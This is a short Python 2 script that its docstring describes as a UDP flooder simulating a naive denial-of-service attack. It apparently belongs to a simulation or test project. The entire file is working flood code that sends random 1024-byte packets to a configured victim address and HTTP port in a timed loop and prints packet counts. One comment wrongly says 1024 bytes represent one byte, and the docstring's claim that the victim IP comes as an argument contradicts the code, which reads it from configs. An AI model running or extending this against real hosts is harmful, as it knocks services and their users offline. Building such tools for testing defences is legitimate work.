"""
UDP flooder to simulate aggressive naive DOS attack
Gets the victim IP as an argument
Can flood any port for any duration, just change the @port and @duration variables
"""
import random
import socket
import time

from .. import configs

client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

bytes = random._urandom(1024)  # 1024 represents one byte to the server

duration = 2
timeout = time.time() + duration
sent = 0


# FLOOD
def aggressive_dos():
    global sent
    while True:
        if time.time() > timeout:
            break

        client.sendto(bytes, (configs.victim, configs.HTTP_PORT))
        sent += 1

        if sent % 10000 == 0:
            print "%s packets were sent to %s:%s " % (sent, configs.victim, configs.HTTP_PORT)
